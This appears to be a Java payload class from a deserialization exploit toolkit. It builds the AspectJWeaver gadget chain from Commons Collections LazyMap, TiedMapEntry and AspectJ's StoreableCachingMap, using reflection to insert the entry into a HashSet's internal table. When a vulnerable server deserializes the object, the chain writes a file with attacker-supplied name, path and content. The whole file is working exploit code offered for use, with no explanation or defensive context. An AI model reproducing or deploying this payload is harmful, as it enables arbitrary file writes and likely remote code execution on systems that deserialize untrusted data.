package payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class AspectJWeaver {
    public Object upload(String filename,String filepath,String filecontent) throws Exception{
        Constructor ctor = getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Object simpleCache = ctor.newInstance(filepath, 12);

        Transformer ct = new FactoryTransformer(new ConstantFactory(filecontent.getBytes(StandardCharsets.UTF_8)));
        Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        setAccessible(keyField);
        keyField.set(node, entry);

        return map;
    }
    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        setAccessible(ctor);
        return ctor;
    }
    public static void setAccessible(AccessibleObject member) {
        member.setAccessible(true);
    }
}
